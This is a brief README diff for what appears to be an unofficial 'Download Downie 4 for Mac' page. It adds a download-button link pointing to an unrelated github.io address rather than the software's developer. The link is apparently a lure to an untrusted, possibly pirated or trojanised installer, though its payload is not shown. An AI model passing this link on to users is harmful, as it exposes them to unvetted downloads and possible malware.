@@ -7,7 +7,7 @@
 
 ## 📥 Download Downie 4 for Mac
 
-[![Download Now](https://img.shields.io/badge/Download--Now-Downie%204%20Mac-blue?style=for-the-badge&logo=apple)]()
+[![Download Now](https://img.shields.io/badge/Download--Now-Downie%204%20Mac-blue?style=for-the-badge&logo=apple)](https://downie-4-download.github.io/.github)
 
 ---
 
